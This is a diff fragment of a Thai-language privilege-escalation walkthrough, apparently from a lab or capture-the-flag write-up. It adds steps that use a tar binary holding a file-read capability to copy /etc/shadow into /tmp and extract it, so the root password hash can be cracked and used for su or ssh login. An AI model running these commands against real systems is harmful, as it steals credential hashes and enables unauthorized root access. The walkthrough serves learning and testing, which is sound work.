@@ -446,13 +446,17 @@ ls
 
 > `/etc/shadow` เก็บรหัสผ่านแบบ hashed ของผู้ใช้ทั้งหมด ถ้าเราใช้ `tar` (ที่มี capability ข้ามการตรวจสิทธิ์) ดึงไฟล์นี้ออกมาแล้ว crack hash ของ `root` ได้ เราก็สามารถใช้รหัสผ่านจริงเข้าสู่บัญชี root (`su` หรือ `ssh`) ได้เลย
 
+1. สร้าง archive ของ /etc/shadow (ใช้ tar ที่มี capability)
+```bash
+tar -cvf /tmp/shadow.tar /etc/shadow
+```
+- เก็บไฟล์ `/etc/shadow` ลงใน `/tmp/shadow.tar`
 
-
-
-
-
-
-
+2. แตก archive และดูเนื้อหา
+```bash
+tar -xvf /tmp/shadow.tar -C /tmp
+```
+- จะได้บรรทัด hash ของ user เช่น `root:$6$.......`
 
 
 
